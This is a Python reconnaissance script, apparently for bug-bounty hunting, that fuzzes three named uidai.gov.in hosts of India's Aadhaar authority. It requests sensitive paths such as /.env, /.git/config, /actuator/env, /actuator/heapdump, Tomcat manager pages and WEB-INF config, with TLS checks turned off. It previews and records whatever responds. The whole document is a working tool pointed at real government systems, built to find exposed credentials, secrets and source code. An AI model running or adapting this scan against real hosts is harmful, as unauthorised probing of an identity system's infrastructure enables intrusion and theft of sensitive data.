"""
Targeted Fuzzer for Critical Backend Exposures
Looking for Swagger docs, Actuators, Tomcat Managers, and Git configs
"""
import requests
import warnings
warnings.filterwarnings('ignore')

TARGETS = [
    "https://tathyamndc.uidai.gov.in",
    "https://bookappointment.uidai.gov.in",
    "https://tathya.uidai.gov.in"
]

# High-value bounty targets
CRITICAL_PATHS = [
    # Swagger / OpenAPI
    "/v2/api-docs", "/v3/api-docs", "/api-docs", "/swagger.json",
    "/swagger-ui.html", "/swagger-ui/", "/api/swagger.json",
    "/api/v1/api-docs", "/docs", "/openapi.json",
    
    # Spring Boot Actuators (RCE/Info Disclosure)
    "/actuator", "/actuator/env", "/actuator/heapdump", 
    "/actuator/mappings", "/actuator/beans", "/actuator/configprops",
    
    # Tomcat specific
    "/manager/html", "/host-manager/html", "/docs/", 
    "/audioCaptchaService/manager/html", "/audioCaptchaService/docs/",
    
    # Source Code / Configs
    "/.git/config", "/.env", "/.env.production", "/.env.local",
    "/config.json", "/assets/config.json", "/application.properties",
    "/application.yml", "/WEB-INF/web.xml", "/WEB-INF/classes/"
]

print("=" * 70)
print("DEEP FUZZER: Hunting for Swagger, Actuators, and Configs")
print("=" * 70)

results = []

for target in TARGETS:
    print(f"\n[SCANNING] {target}")
    for path in CRITICAL_PATHS:
        url = target + path
        try:
            r = requests.get(url, timeout=5, verify=False, allow_redirects=False)
            
            # Filter out generic 404s, 403s, and 500s
            if r.status_code in [200, 301, 302]:
                size = len(r.content)
                print(f"  [+] FOUND [{r.status_code}] - {url} (Size: {size})")
                if size < 1000 and r.status_code == 200:
                     print(f"      Preview: {r.text[:150].strip()}")
                results.append((url, r.status_code, size))
            elif r.status_code == 401:
                print(f"  [!] AUTH REQ [{r.status_code}] - {url} (Valid endpoint!)")
                results.append((url, r.status_code, len(r.content)))
        except requests.exceptions.RequestException:
            pass

print("\n" + "=" * 70)
print("SCAN COMPLETE")
print("=" * 70)
